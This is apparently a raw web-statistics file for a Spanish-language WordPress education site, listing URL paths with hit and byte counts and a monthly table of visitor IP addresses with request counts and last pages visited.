+0 16 0 137892 3 5 0 0
+/wp-admin/admin-post.php
+0 1 0 379 1 0 0 0
+/category/sin-categoria/
+0 2 0 11711 1 1 0 0
+/wp-content/uploads/maestria-desarrollo-software.jpg
+1 3 0 165669 0 0 0 0
+/la-estrategia-en-la-entrevista-de-aconsejamiento/
+0 13 0 201988 4 3 0 0
+/wp-content/uploads/directores-educacion.jpg
+1 2 0 168485 0 0 0 0
+/wp-content/uploads/ProQuest.jpg
+1 94 0 1838392 0 0 0 0
+/wp-content/uploads/programa-salud-940x598.jpg
+1 3 0 415111 0 0 0 0
+/proiectum/educacion/
+0 20 0 111863 18 8 0 0
+/wp-content/uploads/caracter1-460x292.jpg
+1 40 0 1176258 0 0 0 0
+/sitemap-misc.xml
+0 2 0 1648 0 0 0 0
+/portfolio/sexualidad/
+0 13 0 117774 3 2 0 0
+/wp-content/uploads/Vision-UMVirtual.jpg
+1 1 0 173 0 0 0 0
+/
+0 586 0 6823201 576 187 0 0
+/wp-content/themes/inceptio/js/modernizr.custom.js
+0 311 0 2066368 0 0 0 0
+/bloopers-2014/
+0 11 0 108367 4 3 0 0
+/wp-content/uploads/tutoria-virtual-460x292.jpg
+1 54 0 1499477 0 0 0 0
+/wp-content/uploads/directores-educacion-940x598.jpg
+1 2 0 163191 0 0 0 0
+/newsletter/images/iconos_05.jpg
+1 39 0 81670 0 0 0 0
+/wp-content/uploads/intro-investigacion.jpg
+1 3 0 109050 0 0 0 0
+/wp-content/uploads/evangelismo.jpg
+1 1 3 173 0 0 0 0
+/wp-content/uploads/estrategias-ensenanza.jpg
+1 3 0 3632224 0 0 0 0
+/wp-content/plugins/akismet/_inc/form.js
+0 12 0 7890 0 0 0 0
+/wp-content/themes/inceptio/css/mediaelementplayer.css
+0 315 0 253729 0 0 0 0
+/wp-content/uploads/maestria-desarrollo-software-460x292.jpg
+1 57 0 1146265 0 0 0 0
+/wp-content/uploads/disenar-actividades.jpg
+1 5 0 239362 0 0 0 0
+/portfolio/maestria-en-educacion/
+0 16 0 225755 5 1 0 0
+/wp-content/uploads/maestria-desarrollo-software-940x598.jpg
+1 5 0 303542 0 0 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/linkedin.png
+1 4 0 5688 0 0 0 0
+/wp-content/uploads/favicon.png
+1 191 0 1621662 0 0 0 0
+/wp-content/uploads/Lorena_Neria.jpg
+1 2 0 37252 0 0 0 0
+/newsletter/images/iconos_02.jpg
+1 39 0 95023 0 0 0 0
+/wp-content/themes/inceptio/images/block-16.png
+1 246 0 888164 0 0 0 0
+/wp-content/uploads/egw.jpg
+1 94 0 1371715 0 0 0 0
+/wp-content/uploads/integracion-fe.jpg
+1 1 0 45280 0 0 0 0
+/wp-content/themes/inceptio/images/carousel-arrows.png
+1 69 0 89888 0 0 0 0
+/comments/feed/
+0 6 0 9249 0 0 0 0
+/wp-content/uploads/c-influencia-460x292.jpg
+1 46 0 1736080 0 0 0 0
+/wp-content/uploads/paternidad-460x292.jpg
+1 44 0 1622934 0 0 0 0
+/disfrutar-y-aprender-mas-en-plataformas-de-e-learning/feed/
+0 1 0 917 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/css/static-captions.css
+0 320 0 145369 0 0 0 0
+/wp-content/uploads/Maestria_en_Educacion-940x598.jpg
+1 7 0 485737 0 0 0 0
+/wp-content/uploads/orientacion-profetica-940x598.jpg
+1 2 0 196230 0 0 0 0
+/proiectum/educacion/images/bkg-title.jpg
+1 8 0 41242 0 0 0 0
+/wp-content/themes/inceptio/images/arrowbox-title-arrow-front.png
+1 169 0 252772 0 0 0 0
+/author/mario-pereyra/
+0 8 0 71261 1 3 0 0
+/wp-content/themes/inceptio/js/jquery.isotope.min.js
+0 306 0 1645070 0 0 0 0
+/proiectum/educacion/images/proiectum.svg
+0 12 0 42230 0 0 0 0
+/author/caty/
+0 9 0 78494 5 0 0 0
+/wp-content/themes/inceptio/images/nav-arrow.png
+1 141 0 175447 0 0 0 0
+/wp-content/themes/inceptio/images/bullets/list-square.png
+1 12 0 15276 0 0 0 0
+/wp-content/uploads/tecnicas-efectivas.jpg
+1 46 0 3615933 0 0 0 0
+/wp-content/uploads/relaciones_familiares.jpg
+1 9 0 4329681 0 0 0 0
+/portfolio/tecnicas-de-ventas-efectivas/
+0 12 0 118540 3 1 0 0
+/wp-content/uploads/Familia.jpg
+1 3 0 314814 0 0 0 0
+/portfolio/licenciatura-en-administracion-de-empresas/
+0 12 0 188798 1 1 0 0
+/wp-content/themes/inceptio/images/blog/folder.png
+1 4 0 5660 0 0 0 0
+/tag/aprendizaje/
+0 4 0 45599 1 0 0 0
+/wp-content/uploads/teologia-940x598.jpg
+1 63 0 5313188 0 0 0 0
+/author/leticia/
+0 7 0 64718 3 0 0 0
+/wp-content/uploads/plan-marketing-460x292.jpg
+1 44 0 1163224 0 0 0 0
+/newsletter/images/iconos_07.jpg
+1 12 0 21925 0 0 0 0
+/wp-content/uploads/teologia-aplicada.jpg
+1 5 0 329237 0 0 0 0
+/wp-content/themes/inceptio/js/tinynav.min.js
+0 308 0 384602 0 0 0 0
+/portfolio/evangelismo-publico/
+0 10 0 91431 1 3 0 0
+/newsletter/images/iconos_06.jpg
+1 12 0 18197 0 0 0 0
+/wp-content/uploads/fimpes.jpg
+1 94 0 3501026 0 0 0 0
+/wp-content/uploads/goyo.png
+1 223 0 72990053 0 0 0 0
+/wp-content/themes/inceptio/images/slider/nav.png
+1 6 0 7773 0 0 0 0
+/wp-content/themes/inceptio/css/shortcodes.css
+0 288 0 1115773 0 0 0 0
+/robots.txt
+0 114 0 761156 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.gmap.min.js
+0 308 0 1550425 0 0 0 0
+/feed/
+0 50 0 750976 34 20 0 0
+/wp-content/uploads/UM-fondo.jpg
+1 202 0 2784669 0 0 0 0
+/wp-content/uploads/reconocimiento.png
+1 189 0 3932011 0 0 0 0
+/proiectum/educacion/images/facebook.svg
+0 10 0 14486 0 0 0 0
+/la-estrategia-en-la-entrevista-de-aconsejamiento/feed/
+0 2 0 1853 1 1 0 0
+/tag/cosmovision/feed/
+0 1 0 7654 1 0 0 0
+/portfolio/la-educacion-adventista-en-el-ambiente-contemporaneo/
+0 10 0 91294 2 3 0 0
+/wp-content/uploads/e42.jpg
+1 5 0 525245 0 0 0 0
+/wp-content/uploads/Caty_Trisca.jpg
+1 3 0 44676 0 0 0 0
+/wp-content/themes/inceptio-child/fonts/umvirtual.eot
+0 21 0 70371 0 0 0 0
+/wp-cron.php
+0 41 0 7272 34 33 0 0
+/wp-content/uploads/sep.jpg
+1 94 0 3765944 0 0 0 0
+/wp-content/plugins/revslider/rs-plugin/assets/loader.gif
+1 167 0 479923 0 0 0 0
+/articulos/
+0 17 0 225623 2 2 0 0
+/wp-content/uploads/Diapositiva12.jpg
+1 2 0 176248 0 0 0 0
+/wp-content/themes/inceptio/js/froogaloop.min.js
+0 315 0 350704 0 0 0 0
+/wp-content/uploads/entrevista-consejeria.jpg
+1 2 0 239819 0 0 0 0
+/author/harvey/
+0 6 0 58457 0 0 0 0
+/portfolio/atencion-y-servicio-al-cliente/
+0 11 0 101893 1 2 0 0
+/portfolio/formacion-de-promotores-de-salud-y-evangelismo/
+0 20 0 170156 3 2 0 0
+/wp-content/themes/inceptio/images/slider/arrows.png
+1 6 0 7011 0 0 0 0
+/wp-content/themes/inceptio/images/arrow-box-hover.png
+1 207 0 256607 0 0 0 0
+/wp-content/uploads/orientacion-profetica.jpg
+1 3 0 355864 0 0 0 0
+/wp-content/themes/inceptio/images/um.png
+1 271 0 4646100 0 0 0 0
+/portfolio/teologia-aplicada/
+0 11 0 107413 3 2 0 0
+/educacion-continua/
+0 58 0 593261 8 6 0 0
+/wp-content/uploads/Mario-Pereyra.jpg
+1 1 0 9458 0 0 0 0
+/wp-admin/admin-ajax.php
+0 789 0 4037037 29 26 0 0
+/tag/video/
+0 5 0 50904 0 0 0 0
+/wp-content/
+0 13 0 2771 0 0 0 0
+/wp-content/uploads/vida-pareja-460x292.jpg
+1 45 0 1350164 0 0 0 0
+/wp-content/uploads/salud-evangelismo-460x292.jpg
+1 35 0 886624 0 0 0 0
+/newsletter/images/head.jpg
+1 6 0 104673 0 0 0 0
+/wp-content/themes/inceptio/images/icon-boxes/128x128/transparent.png
+1 179 0 272392 0 0 0 0
+/proiectum/educacion/images/innova-educacion.svg
+0 12 0 60039 0 0 0 0
+/wp-content/uploads/disenar-actividades-940x598.jpg
+1 5 0 293088 0 0 0 0
+/wp-content/uploads/escribas_manuscritos-940x598.jpg
+1 1 2 173 0 0 0 0
+/wp-content/uploads/relaciones_familiares-460x292.jpg
+1 58 0 1934131 0 0 0 0
+/wp-content/uploads/plan-marketing-940x598.jpg
+1 4 0 230022 0 0 0 0
+/portfolio/teologia/
+0 88 0 1147053 66 7 0 0
+/wp-content/themes/inceptio/images/tick-16.png
+1 246 0 854883 0 0 0 0
+/wp-content/uploads/EBSCO.jpg
+1 94 0 1023308 0 0 0 0
+/wp-content/themes/inceptio/css/ie.css
+0 6 0 6733 0 0 0 0
+/2015/03/
+0 8 0 74691 0 2 0 0
+/wp-content/themes/inceptio/images/social-media/main-content/google-plus.png
+1 7 0 10642 0 0 0 0
+/wp-content/themes/inceptio/js/jquery.fancybox.pack.js
+0 304 0 2795466 0 0 0 0
+/wp-content/plugins/all-in-one-seo-pack/images/shield-sprite-16.png
+1 1 0 170 0 0 0 0
+/contacto/
+0 23 0 275273 6 7 0 0
+/wp-content/themes/inceptio/images/web-browsers/opera.png
+1 1 0 4734 0 0 0 0
+/portfolio/integracion-de-la-fe-en-la-ensenanza/
+0 8 0 76304 1 2 0 0
+# End Of Table - urls
+# -sites- (monthly)
+189.234.118.200
+0 1 0 20571 0 0 0 0
+-
+180.76.6.63
+0 1 1 8305 1 1427887454 0 0
+/educacion-continua/
+173.252.101.115
+0 2 2 263452 0 0 0 0
+-
+200.23.91.184
+0 7 0 62455 0 0 0 0
+-
+67.81.227.172
+0 1 0 20571 0 0 0 0
+-
+177.231.217.45
+0 93 93 3594791 1 1428272650 0 0
+/wp-admin/admin-ajax.php
+190.238.243.88
+0 1 0 20571 0 0 0 0
+-
+187.168.84.217
+0 98 98 4114445 1 1428276758 0 0
+/wp-admin/admin-ajax.php
+177.242.164.3
+0 94 94 4101070 1 1428067732 0 0
+/wp-admin/admin-ajax.php
+189.158.73.115
+0 147 147 6345030 1 1428014888 0 0
+/wp-admin/admin-ajax.php
+187.244.228.91
+0 2 2 157766 0 0 0 0
+-
+177.133.98.90
+0 104 104 5743624 1 1427893048 0 0
+/wp-admin/admin-ajax.php
+190.235.129.170
+0 18 18 264744 1 1428270564 0 0
+/educacion-continua/
+95.126.164.101
+0 1 0 20571 0 0 0 0
+-
+186.15.8.227
+0 85 85 899302 1 1428237871 0 0
+/wp-admin/admin-ajax.php
+201.141.151.188
+0 87 87 1060448 1 1428186028 0 0
+/wp-admin/admin-ajax.php
+189.244.195.216
+0 154 154 7281618 1 1427932941 0 0
+/
+201.114.143.238
+0 217 194 6242995 1 1428130833 0 0
+/wp-admin/admin-ajax.php
+65.55.185.238
+0 6 6 24827 0 0 0 0
+-
+190.87.76.117
+0 1 1 124350 0 0 0 0
+-
+180.76.5.187
+0 4 3 13849 4 1428267014 0 0
+/acerca/
+65.55.65.14
+0 25 19 215102 0 0 0 0
+-
+187.138.137.152
+0 92 92 4091166 1 1428069563 0 0
+/wp-admin/admin-ajax.php
+66.249.73.141
+0 15 2 9888 6 1428279835 0 0
+-
+157.56.17.206
+0 18 18 74481 0 0 0 0
+-
+186.178.34.181
+0 1 1 78883 0 0 0 0
+-
+65.55.157.153
+0 6 6 24827 0 0 0 0
+-
+187.189.166.152
+0 1 0 20571 0 0 0 0
+-
+208.78.85.240
+0 1 1 8157 1 1428189284 0 0
+/
+69.171.248.3
+0 1 1 78883 0 0 0 0
+-
+199.59.148.211
+0 4 4 19688 2 1428271694 0 0
+/
+180.76.5.94
+0 2 1 3517 1 1427897841 0 0
+/portfolio/plan-de-marketing/
+190.236.62.80
+0 1 1 78883 0 0 0 0
+-
+201.102.142.165
+0 1 1 114299 0 0 0 0
+-
+202.46.60.99
+0 1 0 404 0 0 0 0
+-
+5.157.41.28
+0 3 2 10061 1 1428092511 0 0
+/wp-login.php
+173.252.114.119
+0 1 1 17588 0 0 0 0
+-
+191.112.52.220
+0 1 0 20571 0 0 0 0
+-
+189.152.30.39
+0 97 97 4261207 1 1428251500 0 0
+/wp-admin/admin-ajax.php
+10.7.219.116
+0 95 95 4109228 2 1428254449 0 0
+/wp-admin/admin-ajax.php
+189.133.124.93
+0 212 212 10467830 2 1427885692 0 0
+/wp-admin/admin-ajax.php
+190.163.145.36
+0 1 1 78883 0 0 0 0
+-
+200.76.83.36
+0 6 6 109265 0 0 0 0
+-
+189.162.249.184
+0 1 0 20571 0 0 0 0
+-
+190.207.64.82
+0 87 87 1060451 1 1428057820 0 0
+/wp-admin/admin-ajax.php
+189.214.222.85
+0 99 99 4249275 1 1428132740 0 0
+/wp-admin/admin-ajax.php
+66.220.152.116
+0 2 2 17453 1 1427861440 0 0
+/
+177.189.28.15
+0 1 0 20578 0 0 0 0
+-
+187.176.82.117
+0 1 1 171494 0 0 0 0
+-
+69.171.248.2
+0 1 1 78895 0 0 0 0
+-
+181.112.175.144
+0 1 1 78883 0 0 0 0
+-
+63.226.66.2
+0 1 0 20571 0 0 0 0
+-
+187.173.174.180
+0 1 0 20571 0 0 0 0
+-
+187.140.117.224
+0 1 1 40080 0 0 0 0
+-
+200.76.83.141
+0 18 18 83225 0 0 0 0
+-
+188.165.15.214
+0 137 63 753245 68 1428275386 0 0
+-
+187.149.41.215
+0 14 12 208501 1 1427928644 0 0
+/wp-admin/admin-ajax.php
+45.36.48.28
+0 9 9 30935 0 0 0 0
+-
+189.135.18.60
+0 1 0 20571 0 0 0 0
+-
+201.141.91.93
+0 1 1 40080 0 0 0 0
+-
+66.220.152.114
+0 4 4 106749 0 0 0 0
+-
+52.5.85.116
+0 1 1 34432 1 1427925663 0 0
+/
+189.158.38.141
+0 3 3 394408 1 1427935152 0 0
+/
+190.119.32.125
+0 115 115 4568401 2 1428157929 0 0
+/wp-admin/admin-ajax.php
+180.76.4.107
+0 1 0 285 1 1427864647 0 0
+/
+194.187.168.24
+0 25 24 142567 3 1428158344 0 0
+/el-valor-de-un-grado-academico-de-maestria/feed/
+206.48.129.204
+0 1 1 78883 0 0 0 0
+-
+189.186.206.93
+0 139 139 5602807 1 1427967714 0 0
+/wp-admin/admin-ajax.php
+200.74.89.103
+0 1 1 78883 0 0 0 0
+-
+66.249.84.162
+0 1 1 8157 1 1427964627 0 0
+/
+200.105.251.170
+0 86 86 1051923 1 1428259416 0 0
+/wp-admin/admin-ajax.php
+67.142.130.36
+0 1 1 78846 0 0 0 0
+-
+180.76.5.192
+0 1 0 334 1 1428031308 0 0
+/la-estrategia-en-la-entrevista-de-aconsejamiento/
+203.133.168.33
+0 1 1 8157 1 1427870626 0 0
+/
+114.111.167.21
+0 2 2 26576 0 0 0 0
+-
+201.204.158.217
+0 1 1 78883 0 0 0 0
+-
+66.249.73.210
+0 15 0 6613 9 1428282684 0 0
+-
+187.131.28.119
+0 1 0 20570 0 0 0 0
+-
+70.32.93.88
+0 2 1 26454 0 0 0 0
+-
+10.7.220.243
+0 110 110 8625770 1 1428273928 0 0
+/wp-admin/admin-ajax.php
+187.234.68.45
+0 87 87 1060445 1 1428086477 0 0
+/wp-admin/admin-ajax.php
+201.191.199.97
+0 111 111 3353566 1 1428066454 0 0
+/wp-admin/admin-ajax.php
+187.254.53.1
+0 1 1 78883 0 0 0 0
+-
+190.152.129.108
+0 1 0 20571 0 0 0 0
+-
+66.220.156.114
+0 3 2 158216 0 0 0 0
+-
+220.181.108.154
+0 1 1 34395 1 1427993864 0 0
+/
+190.239.212.39
+0 1 1 36400 0 0 0 0
+-
+201.145.33.145
+0 1 0 20571 0 0 0 0
+-
+69.171.230.116
+0 1 1 78883 0 0 0 0
+-
+189.152.54.35
+0 81 81 3315078 1 1428256506 0 0
+/wp-admin/admin-ajax.php
+177.224.255.136
+0 1 1 78883 0 0 0 0
+-
+50.244.153.33
+0 85 85 1839015 1 1427881484 0 0
+/wp-admin/admin-ajax.php
+189.217.205.21
+0 1 1 68633 0 0 0 0
+-
+186.119.232.121
+0 2 2 248700 0 0 0 0
+-
+201.161.24.191
+0 2 0 41142 0 0 0 0
+-
+189.219.188.245
+0 102 102 4263602 1 1428052612 0 0
+/wp-admin/admin-ajax.php
+187.147.131.74
+0 1 0 20571 0 0 0 0
+-
+189.151.102.190
+0 1 1 78883 0 0 0 0
+-
+189.231.10.143
+0 87 87 1053231 1 1427877794 0 0
+/wp-admin/admin-ajax.php
+180.76.5.61
+0 1 1 8153 0 0 0 0
+-
+187.212.177.99
+0 130 130 2884017 1 1428060288 0 0
+/wp-admin/admin-ajax.php
+123.125.71.84
+0 1 1 34395 1 1427957401 0 0
+/
+189.132.223.154
+0 1 1 114299 0 0 0 0
+-
+65.55.143.27
+0 6 6 24827 0 0 0 0
+-
+180.76.6.17
+0 2 2 14155 2 1428075792 0 0
+/diplomados/
+194.187.168.22
+0 19 19 125432 3 1428282490 0 0
+/tag/e-learning/
+161.18.101.224
+0 1 0 20571 0 0 0 0
+-
+200.76.83.12
+0 6 6 132078 1 1427882531 0 0
+/wp-admin/admin-ajax.php
+180.76.5.17
+0 2 1 7227 2 1428250395 0 0
+/
+192.210.198.242
+0 202 202 123220 26 1428259902 0 0
+/xmlrpc.php
+200.76.83.79
+0 6 6 81588 0 0 0 0
+-
+66.201.161.243
+0 1 0 20571 0 0 0 0
+-
+190.78.22.231
+0 1 0 20571 0 0 0 0
+-
+187.189.190.8
+0 1 0 20570 0 0 0 0
+-
+104.154.116.137
+0 1 1 8156 1 1428222587 0 0
+/
+189.248.201.65
+0 1 0 20571 0 0 0 0
+-
+189.132.221.215
+0 126 126 4822270 1 1427881394 0 0
+/wp-admin/admin-ajax.php
+190.72.235.197
+0 1 1 40080 0 0 0 0
+-
+190.102.140.216
+0 83 72 582318 1 1427907628 0 0
+/wp-admin/admin-ajax.php
+199.30.24.226
+0 1 1 426 0 0 0 0
+-
+201.127.133.60
+0 95 95 4106999 1 1428154305 0 0
+/acerca/testimonios/
+54.91.55.169
+0 95 94 4094148 1 1427967053 0 0
+/wp-admin/admin-ajax.php
+190.205.5.156
+0 1 0 20571 0 0 0 0
+-
+187.147.139.210
+0 68 68 1771628 1 1427890233 0 0
+/wp-admin/admin-ajax.php
+123.125.71.33
+0 1 0 20532 0 0 0 0
+-
+201.141.80.74
+0 1 0 20571 0 0 0 0
+-
+201.171.41.240
+0 2 0 41142 0 0 0 0
+-
+189.217.152.153
+0 98 98 4247601 1 1428026538 0 0
+/
+189.236.70.146
+0 7 7 158899 1 1427891974 0 0
+/wp-admin/admin-ajax.php
+189.222.173.190
+0 88 88 1061741 1 1427881676 0 0
+/wp-admin/admin-ajax.php
+190.79.22.205
+0 1 0 20571 0 0 0 0
+-
+189.131.209.191
+0 1 0 20571 0 0 0 0
+-
+94.228.34.210
+0 24 16 423218 8 1428284416 0 0
+/feed/atom/
+173.252.73.116
+0 1 1 78883 0 0 0 0
+-
+50.167.92.17
+0 86 86 1051907 1 1428276915 0 0
+/wp-admin/admin-ajax.php
+190.148.81.109
+0 1 0 20571 0 0 0 0
+-
+211.49.99.17
+0 1 0 521 1 1428277005 0 0
+-
+189.165.176.193
+0 119 119 4837824 1 1428169448 0 0
+/wp-admin/admin-ajax.php
+201.172.100.192
+0 103 103 4425946 1 1428231112 0 0
+/
+199.16.156.125
+0 2 2 8348 1 1428221294 0 0
+/portfolio/quiero-vivir-sano-8-habitos-saludables/
+66.249.90.86
+0 12 0 246946 7 1428272675 0 0
+-
+190.127.232.106
+0 105 105 3677331 1 1428265714 0 0
+/wp-admin/admin-ajax.php
+179.7.85.137
+0 2 0 41146 0 0 0 0
+-
+208.80.194.29
+0 3 0 61657 2 1428287234 0 0
+-
+206.253.226.22
+0 5 4 71813 1 1427961588 0 0
+/
+64.89.234.161
+0 1 1 8102 1 1428216105 0 0
+/
+187.161.5.99
+0 107 107 4649498 1 1428237006 0 0
+/wp-admin/admin-ajax.php
+181.65.95.180
+0 1 1 78883 0 0 0 0
+-
+180.76.6.66
+0 1 0 332 1 1427996983 0 0
+/portfolio/salud-emocional-y-bienestar-personal/
+186.10.18.93
+0 1 1 78883 0 0 0 0
+-
+189.179.144.6
+0 1 0 20571 0 0 0 0
+-
+201.173.116.32
+0 119 119 4752507 1 1428057860 0 0
+/wp-admin/admin-ajax.php
+190.238.167.4
+0 2 1 79056 0 0 0 0
+-
+180.76.6.54
+0 2 1 6951 2 1427964916 0 0
+/portfolio/formacion-en-tutoria-virtual/
+186.35.103.210
+0 1 1 78883 0 0 0 0
+-
+186.13.1.21
+0 1 1 77900 0 0 0 0
+-
+181.108.71.147
+0 1 0 20515 0 0 0 0
+-
+65.55.183.46
+0 6 6 24827 0 0 0 0
+-
+200.76.91.140
+0 4 4 334424 0 0 0 0
+-
+190.239.190.98
+0 1 1 78883 0 0 0 0
+-
+78.46.203.72
+0 3 3 103128 1 1428280292 0 0
+/
+107.167.103.146
+0 1 1 14138 1 1427971034 0 0
+/feed/
+190.141.21.167
+0 131 131 2597154 1 1427972263 0 0
+/wp-admin/admin-ajax.php
+220.181.108.84
+0 1 1 34395 1 1427877587 0 0
+/
+190.31.35.50
+0 1 0 20571 0 0 0 0
+-
+136.243.36.85
+0 87 84 630734 1 1428129181 0 0
+/proiectum/educacion/
+187.147.183.31
+0 1 1 68633 0 0 0 0
+-
+181.64.166.208
+0 2 2 157766 0 0 0 0
+-
+180.76.5.80
+0 1 1 7789 1 1427857870 0 0
+/cursos-cortos/
+201.157.85.189
+0 1 0 20571 0 0 0 0
+-
+190.86.56.114
+0 3 0 61713 0 0 0 0
+-
+180.76.6.149
+0 1 1 8122 1 1428064182 0 0
+/
+220.181.108.185
+0 1 1 8120 1 1427993830 0 0
+/
+198.199.82.115
+0 51 46 394638 1 1428144776 0 0
+/articulos/
+52.4.93.111
+0 1 1 13114 0 0 0 0
+-
+66.249.65.153
+0 198 109 2722409 42 1428288677 0 0
+/portfolio/quiero-vivir-sano-8-habitos-saludables/
+192.99.166.202
+0 30 26 570011 1 1427847549 0 0
+/wp-login.php
+200.118.69.174
+0 1 0 20571 0 0 0 0
+-
+180.76.5.67
+0 1 1 7654 1 1427954827 0 0
+/tag/cosmovision/feed/
+187.243.194.16
+0 248 245 10285479 3 1428263615 0 0
+/wp-admin/admin-ajax.php
+173.252.77.116
+0 1 1 1772 0 0 0 0
+-
+180.76.6.232
+0 1 0 297 1 1428137214 0 0
+/author/caty/
+123.125.71.42
+0 1 1 977779 0 0 0 0
+-
+179.7.127.255
+0 1 1 78883 0 0 0 0
+-
+66.220.158.115
+0 2 2 157766 0 0 0 0
+-
+180.76.5.27
+0 1 1 8122 1 1428045974 0 0
+/
+186.146.12.252
+0 2 0 41142 0 0 0 0
+-
+190.181.227.75
+0 88 87 1056464 1 1428014827 0 0
+/wp-admin/admin-ajax.php
+186.42.217.43
+0 1 0 20571 0 0 0 0
+-
+186.149.173.204
+0 16 11 153100 0 0 0 0
+-
+91.121.100.66
+0 1 1 34376 1 1428076761 0 0
+/
+190.56.71.97
+0 1 1 78883 0 0 0 0
+-
+201.230.139.99
+0 4 4 158683 0 0 0 0
+-
+187.241.179.105
+0 9 9 30935 0 0 0 0
+-
+189.175.72.163
+0 9 9 30936 0 0 0 0
+-
+182.118.20.166
+0 1 1 1943 0 0 0 0
+-
+65.55.157.190
+0 1 1 36705 0 0 0 0
+-
+190.86.106.5
+0 2 2 169884 0 0 0 0
+-
+190.238.235.113
+0 1 1 171494 0 0 0 0
+-
+190.27.36.114
+0 295 293 11740326 2 1428006629 0 0
+/wp-admin/admin-ajax.php
+162.210.196.130
+0 4 4 94862 2 1428203497 0 0
+/
+220.181.132.200
+0 51 51 343881 1 1428235732 0 0
+/
+190.83.234.56
+0 77 77 2633156 1 1427863480 0 0
+/wp-admin/admin-ajax.php
+180.76.6.28
+0 1 0 415 1 1427992449 0 0
+/
+189.152.6.24
+0 92 51 356074 1 1428086547 0 0
+/wp-admin/admin-ajax.php
+191.116.205.17
+0 1 0 20571 0 0 0 0
+-
+180.76.6.143
+0 2 0 731 1 1428168096 0 0
+/
+189.140.32.133
+0 1 0 20576 0 0 0 0
+-
+189.146.155.213
+0 1 0 20571 0 0 0 0
+-
+104.154.27.210
+0 63 63 2246458 1 1428267000 0 0
+/
+86.127.131.104
+0 2 2 16314 2 1427898721 0 0
+/
+173.252.120.117
+0 1 1 78883 0 0 0 0
+-
+190.240.204.87
+0 1 1 78883 0 0 0 0
+-
+66.249.65.189
+0 2 2 9936 1 1427957021 0 0
+/
+66.220.152.119
+0 2 2 88171 0 0 0 0
+-
+180.76.4.73
+0 1 0 285 1 1428152320 0 0
+/
+192.0.86.99
+0 1 1 245 1 1428172140 0 0
+/
+201.110.231.246
+0 1 0 20571 0 0 0 0
+-
+186.3.32.124
+0 452 445 11283061 1 1427984128 0 0
+/wp-admin/admin-ajax.php
+172.16.254.8
+0 41 41 7272 34 1428285915 0 0
+/wp-cron.php
+173.252.114.117
+0 2 2 357655 0 0 0 0
+-
+200.86.243.11
+0 1 1 78883 0 0 0 0
+-
+186.176.240.254
+0 2 0 41206 0 0 0 0
+-
+173.252.112.113
+0 1 1 78883 0 0 0 0
+-
+201.145.13.148
+0 1 1 89873 0 0 0 0
+-
+104.197.42.109
+0 1 1 34354 1 1428138344 0 0
+/
+180.76.6.150
+0 1 0 369 1 1427865391 0 0
+/
+190.43.238.100
+0 3 3 120240 0 0 0 0
+-
+187.208.51.20
+0 1 0 20571 0 0 0 0
+-
+186.30.105.96
+0 1 1 78883 0 0 0 0
+-
+189.156.168.108
+0 93 93 4092540 1 1428250463 0 0
+/wp-admin/admin-ajax.php
+187.189.149.219
+0 97 97 4114504 1 1428282447 0 0
+/wp-admin/admin-ajax.php
+190.91.240.194
+0 1 1 78883 0 0 0 0
+-
+10.11.209.32
+0 2 2 8427 1 1427891530 0 0
+/
+189.188.84.114
+0 2 0 41142 0 0 0 0
+-
+190.47.42.25
+0 1 1 78883 0 0 0 0
+-
+187.213.174.189
+0 99 99 3207109 1 1428153685 0 0
+/wp-admin/admin-ajax.php
+200.76.91.43
+0 8 8 439661 0 0 0 0
+-
+187.184.186.66
+0 11 11 228612 1 1427921356 0 0
+/evangelismo-tecnologico/
+200.76.91.76
+0 10 10 1017800 0 0 0 0
+-
+192.0.86.114
+0 1 1 245 1 1428224530 0 0
+/
+66.249.84.169
+0 1 1 8537 0 0 0 0
+-
+189.152.19.45
+0 356 356 12914895 2 1427909950 0 0
+/wp-admin/admin-ajax.php
+188.165.15.165
+0 1 1 1887 0 0 0 0
+-
+66.119.41.34
+0 3 3 24474 2 1428278341 0 0
+/
+162.246.20.83
+0 3 3 23502 1 1428239981 0 0
+/wp-admin/admin-ajax.php
+64.60.234.34
+0 1 1 78883 0 0 0 0
+-
+187.193.200.133
+0 89 89 1063065 1 1428172652 0 0
+/wp-admin/admin-ajax.php
+180.76.6.40
+0 2 2 13381 2 1428153916 0 0
+/category/tecnologia/
+104.154.18.95
+0 55 55 2517635 1 1428204941 0 0
+/
+104.197.171.124
+0 1 1 8159 1 1427874070 0 0
+/
+66.249.93.165
+0 1 1 8537 0 0 0 0
+-
+200.76.83.241
+0 7 7 51693 0 0 0 0
+-
+66.249.73.218
+0 10 0 4410 6 1428273347 0 0
+-
+65.55.210.69
+0 82 82 4025772 1 1428028013 0 0
+/wp-admin/admin-ajax.php
+187.176.43.213
+0 2 0 41142 0 0 0 0
+-
+66.249.65.168
+0 44 0 19654 7 1428021932 0 0
+/portfolio/fundamento-desarrollo-y-alcance-del-sistema-educativo-adventista/
+198.228.90.228
+0 2 2 79111 0 0 0 0
+-
+173.252.73.119
+0 2 2 157766 0 0 0 0
+-
+189.175.11.136
+0 1 0 20571 0 0 0 0
+-
+201.240.70.228
+0 87 87 1060446 1 1428176941 0 0
+/wp-admin/admin-ajax.php
+181.66.156.11
+0 2 2 157766 0 0 0 0
+-
+104.154.121.118
+0 1 1 8158 1 1428206527 0 0
+/
+199.59.148.209
+0 4 3 28708 2 1427910186 0 0
+/proiectum/educacion/
+192.187.126.162
+0 11 4 19243 5 1428186973 0 0
+/wp-login.php
+186.2.144.111
+0 1 1 78883 0 0 0 0
+-
+66.220.158.116
+0 3 2 178333 0 0 0 0
+-
+201.131.148.1
+0 1 1 78883 0 0 0 0
+-
+185.31.136.59
+0 40 0 11400 40 1428282636 0 0
+/
+205.197.242.175
+0 2 0 41142 0 0 0 0
+-
+201.110.147.236
+0 2 2 157766 0 0 0 0
+-
+180.76.5.150
+0 1 1 7399 1 1427994837 0 0
+/portfolio/formacion-del-caracter/
+201.127.54.59
+0 1 1 78883 0 0 0 0
+-
+187.138.201.207
+0 99 98 4170900 2 1428259009 0 0
+/wp-admin/admin-ajax.php
+180.76.5.191
+0 1 0 404 0 0 0 0
+-
+181.38.76.141
+0 5 0 102854 0 0 0 0
+-
+220.181.108.165
+0 1 1 8122 1 1428219500 0 0
+/
+180.76.5.23
+0 1 0 404 1 1428279514 0 0
+/
+201.207.106.24
+0 86 86 1051910 1 1428197698 0 0
+/wp-admin/admin-ajax.php
+141.0.9.208
+0 2 2 28276 2 1427969742 0 0
+/feed/
+201.240.211.141
+0 1 1 78883 0 0 0 0
+-
+66.249.88.202
+0 1 0 20571 0 0 0 0
+-
+173.252.73.113
+0 1 1 78883 0 0 0 0
+-
+167.56.25.29
